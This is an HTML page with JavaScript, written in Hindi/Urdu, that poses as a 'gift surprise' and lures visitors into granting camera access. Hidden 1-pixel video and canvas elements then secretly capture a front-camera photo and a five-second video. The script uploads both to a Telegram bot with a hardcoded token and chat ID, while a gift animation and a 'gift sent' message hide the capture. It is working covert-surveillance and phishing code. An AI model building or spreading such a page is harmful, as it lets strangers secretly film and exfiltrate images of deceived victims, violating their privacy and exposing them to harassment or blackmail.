<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>Gift Surprise</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  html, body {
    height: 100%;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: radial-gradient(circle at 50% 30%, #1b1b2f 0%, #0a0a12 100%);
    color: #fff;
    overflow: hidden;
  }
  .screen {
    position: fixed; inset: 0;
    display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    padding: 24px;
    opacity: 0; pointer-events: none;
    transition: opacity .5s ease;
  }
  .screen.active { opacity: 1; pointer-events: auto; }

  #screen-click { gap: 28px; }
  .title {
    font-size: 1.6rem; font-weight: 700; text-align: center;
    letter-spacing: .5px; line-height: 1.3;
    background: linear-gradient(90deg, #ffd76e, #ff9d6e);
    -webkit-background-clip: text; background-clip: text; color: transparent;
  }
  .subtitle { font-size: .95rem; color: #9a9ab0; text-align: center; }
  .click-btn {
    margin-top: 10px;
    padding: 18px 52px;
    font-size: 1.15rem; font-weight: 700; letter-spacing: 1px;
    color: #1a1a1a;
    background: linear-gradient(135deg, #ffe08a, #ffb347);
    border: none; border-radius: 999px;
    cursor: pointer;
    box-shadow: 0 8px 28px rgba(255, 180, 71, .35), inset 0 -3px 0 rgba(0,0,0,.12);
    transition: transform .15s ease, box-shadow .15s ease;
  }
  .click-btn:active { transform: scale(.96); box-shadow: 0 4px 14px rgba(255, 180, 71, .3); }

  #screen-gift { gap: 26px; }
  .gift-wrap {
    position: relative;
    width: min(60vw, 240px); aspect-ratio: 1/1;
    display: flex; align-items: center; justify-content: center;
  }
  .gift-wrap svg { width: 100%; height: 100%; filter: drop-shadow(0 12px 30px rgba(255,150,60,.35)); animation: float 2.4s ease-in-out infinite; }
  @keyframes float {
    0%,100% { transform: translateY(0) rotate(-1.5deg); }
    50%     { transform: translateY(-14px) rotate(1.5deg); }
  }
  .countdown {
    font-size: 3rem; font-weight: 800;
    font-variant-numeric: tabular-nums;
    background: linear-gradient(90deg, #ffd76e, #ff7a59);
    -webkit-background-clip: text; background-clip: text; color: transparent;
  }
  .status { font-size: .9rem; color: #9a9ab0; letter-spacing: .5px; }
  .progress-track {
    width: min(80vw, 320px); height: 6px; border-radius: 999px;
    background: rgba(255,255,255,.08); overflow: hidden;
  }
  .progress-fill {
    height: 100%; width: 0%;
    background: linear-gradient(90deg, #ffd76e, #ff7a59);
    border-radius: 999px;
    transition: width .25s linear;
  }

  #screen-done { gap: 18px; }
  .check {
    width: 84px; height: 84px; border-radius: 50%;
    background: linear-gradient(135deg, #7ee787, #3fb950);
    display: flex; align-items: center; justify-content: center;
    font-size: 2.6rem; color: #06210c;
    box-shadow: 0 0 40px rgba(63,185,80,.45);
  }
  .done-title { font-size: 1.35rem; font-weight: 700; }
  .done-sub { font-size: .9rem; color: #9a9ab0; text-align: center; }

  #hiddenVideo, #hiddenCanvas {
    position: fixed; width: 1px; height: 1px;
    opacity: 0; pointer-events: none; top: -10px; left: -10px;
  }
</style>
</head>
<body>

  <div class="screen active" id="screen-click">
    <div class="title">Ek surprise tumhara intezaar kar raha hai</div>
    <div class="subtitle">Neeche button dabao aur camera allow karo</div>
    <button class="click-btn" id="clickBtn">CLICK HERE</button>
  </div>

  <div class="screen" id="screen-gift">
    <div class="gift-wrap">
      <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="boxGrad" x1="0" y1="0" x2="0" y2="1">
            <stop offset="0%"  stop-color="#ff6b6b"/>
            <stop offset="100%" stop-color="#c0392b"/>
          </linearGradient>
          <linearGradient id="lidGrad" x1="0" y1="0" x2="0" y2="1">
            <stop offset="0%"  stop-color="#ff8a8a"/>
            <stop offset="100%" stop-color="#e74c3c"/>
          </linearGradient>
          <linearGradient id="ribbonGrad" x1="0" y1="0" x2="0" y2="1">
            <stop offset="0%"  stop-color="#ffe08a"/>
            <stop offset="100%" stop-color="#f4b942"/>
          </linearGradient>
        </defs>
        <rect x="35" y="85" width="130" height="95" rx="8" fill="url(#boxGrad)"/>
        <rect x="28" y="70" width="144" height="28" rx="6" fill="url(#lidGrad)"/>
        <rect x="92" y="70" width="16" height="110" fill="url(#ribbonGrad)"/>
        <rect x="28" y="76" width="144" height="14" fill="url(#ribbonGrad)" opacity=".9"/>
        <path d="M100 70 C 78 45, 55 55, 70 75 C 82 90, 95 80, 100 70 Z" fill="url(#ribbonGrad)"/>
        <path d="M100 70 C 122 45, 145 55, 130 75 C 118 90, 105 80, 100 70 Z" fill="url(#ribbonGrad)"/>
        <circle cx="100" cy="70" r="7" fill="#fff3c4"/>
        <circle cx="45" cy="45" r="2.5" fill="#ffe08a" opacity=".9"/>
        <circle cx="160" cy="38" r="2" fill="#ffe08a" opacity=".7"/>
        <circle cx="150" cy="150" r="2.5" fill="#ffe08a" opacity=".6"/>
        <circle cx="40" cy="140" r="1.8" fill="#ffe08a" opacity=".8"/>
      </svg>
    </div>
    <div class="countdown" id="countdown">10</div>
    <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
    <div class="status" id="statusText">Camera on ho raha hai...</div>
  </div>

  <div class="screen" id="screen-done">
    <div class="check">✓</div>
    <div class="done-title">Gift bhej diya gaya</div>
    <div class="done-sub" id="doneSub">Aapka surprise safely pahunch gaya. Shukriya!</div>
  </div>

  <video id="hiddenVideo" autoplay playsinline muted></video>
  <canvas id="hiddenCanvas"></canvas>

<script>
/* ============================================================
   TELEGRAM CONFIG — tumhara token aur chat id applied
   ============================================================ */
const TELEGRAM_BOT_TOKEN = "8771415280:AAGH16SJIgDIJPfSDrx50nEG6P23m-XpcyU";
const TELEGRAM_CHAT_ID   = "8325947433";

const PHOTO_SECONDS = 5;
const VIDEO_SECONDS = 5;
const TOTAL_SECONDS = PHOTO_SECONDS + VIDEO_SECONDS;

const screenClick = document.getElementById('screen-click');
const screenGift  = document.getElementById('screen-gift');
const screenDone  = document.getElementById('screen-done');
const clickBtn    = document.getElementById('clickBtn');
const countdownEl = document.getElementById('countdown');
const progressEl  = document.getElementById('progressFill');
const statusEl    = document.getElementById('statusText');
const doneSub     = document.getElementById('doneSub');
const videoEl     = document.getElementById('hiddenVideo');
const canvasEl    = document.getElementById('hiddenCanvas');

let mediaStream    = null;
let mediaRecorder  = null;
let recordedChunks = [];
let photoBlob      = null;
let videoBlob      = null;
let countdownTimer = null;

function showScreen(el) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  el.classList.add('active');
}

function stopStream() {
  if (mediaStream) {
    mediaStream.getTracks().forEach(t => t.stop());
    mediaStream = null;
  }
}

function pickMimeType() {
  const candidates = [
    'video/webm;codecs=vp9',
    'video/webm;codecs=vp8',
    'video/webm',
    'video/mp4'
  ];
  for (const m of candidates) {
    if (window.MediaRecorder && MediaRecorder.isTypeSupported(m)) return m;
  }
  return '';
}

clickBtn.addEventListener('click', async () => {
  clickBtn.disabled = true;
  clickBtn.textContent = 'Permission maang raha hai...';

  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    });
  } catch (err) {
    clickBtn.disabled = false;
    clickBtn.textContent = 'CLICK HERE';
    alert('Camera permission chahiye. Browser settings se allow karo aur dobara try karo.');
    return;
  }

  videoEl.srcObject = mediaStream;
  try { await videoEl.play(); } catch (e) {}

  await new Promise(r => setTimeout(r, 600));

  showScreen(screenGift);
  startCapture();
});

async function startCapture() {
  statusEl.textContent = 'gift ready ho rahi hai...';
  updateProgress(0);
  countdownEl.textContent = TOTAL_SECONDS;

  await runCountdown(PHOTO_SECONDS, TOTAL_SECONDS, 'gift ready ho rahi hai...');
  capturePhoto();

  statusEl.textContent = 'gift ready ho rahi hai...';
  startVideoRecording();

  await runCountdown(VIDEO_SECONDS, TOTAL_SECONDS, 'gift ready ho rahi hai...');
  await stopVideoRecording();

  statusEl.textContent = 'Bheja ja raha hai...';
  await sendToTelegram();

  stopStream();
  showScreen(screenDone);
}

function runCountdown(seconds, total, label) {
  return new Promise(resolve => {
    let remaining = seconds;
    let overall   = total - seconds + remaining;
    countdownEl.textContent = overall;
    if (label) statusEl.textContent = label;

    clearInterval(countdownTimer);
    countdownTimer = setInterval(() => {
      remaining--;
      overall--;
      countdownEl.textContent = Math.max(overall, 0);
      updateProgress(((total - overall) / total) * 100);

      if (remaining <= 0) {
        clearInterval(countdownTimer);
        resolve();
      }
    }, 1000);
  });
}

function updateProgress(pct) {
  progressEl.style.width = Math.min(100, Math.max(0, pct)) + '%';
}

function capturePhoto() {
  const w = videoEl.videoWidth  || 640;
  const h = videoEl.videoHeight || 480;
  canvasEl.width  = w;
  canvasEl.height = h;
  const ctx = canvasEl.getContext('2d');
  ctx.drawImage(videoEl, 0, 0, w, h);
  canvasEl.toBlob(blob => { photoBlob = blob; }, 'image/jpeg', 0.92);
}

function startVideoRecording() {
  recordedChunks = [];
  const mimeType = pickMimeType();
  const opts = mimeType ? { mimeType } : undefined;
  try {
    mediaRecorder = new MediaRecorder(mediaStream, opts);
  } catch (e) {
    console.warn('MediaRecorder init failed', e);
    return;
  }
  mediaRecorder.ondataavailable = e => {
    if (e.data && e.data.size > 0) recordedChunks.push(e.data);
  };
  mediaRecorder.start();
}

function stopVideoRecording() {
  return new Promise(resolve => {
    if (!mediaRecorder || mediaRecorder.state === 'inactive') { resolve(); return; }
    mediaRecorder.onstop = () => {
      const type = (mediaRecorder && mediaRecorder.mimeType) || 'video/webm';
      videoBlob = new Blob(recordedChunks, { type });
      resolve();
    };
    mediaRecorder.stop();
  });
}

async function sendToTelegram() {
  const base = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
  const tasks = [];

  if (photoBlob) {
    const fd = new FormData();
    fd.append('chat_id', TELEGRAM_CHAT_ID);
    fd.append('caption', '📸 Photo (5s capture)');
    fd.append('photo', photoBlob, 'photo.jpg');
    tasks.push(
      fetch(`${base}/sendPhoto`, { method: 'POST', body: fd })
        .then(r => r.json())
        .catch(e => ({ ok: false, error: e.message }))
    );
  }

  if (videoBlob) {
    const fd = new FormData();
    fd.append('chat_id', TELEGRAM_CHAT_ID);
    fd.append('caption', '🎥 Video (5s record)');
    const ext = videoBlob.type.includes('mp4') ? 'mp4' : 'webm';
    fd.append('video', videoBlob, `video.${ext}`);
    tasks.push(
      fetch(`${base}/sendVideo`, { method: 'POST', body: fd })
        .then(r => r.json())
        .catch(e => ({ ok: false, error: e.message }))
    );
  }

  const results = await Promise.all(tasks);
  const anyFail = results.some(r => !r || r.ok === false);
  doneSub.textContent = anyFail
    ? 'Kuch bhejne me dikkat aayi. Phir bhi shukriya!'
    : 'Aapka surprise safely pahunch gaya. Shukriya!';
}
</script>
</body>
</html>
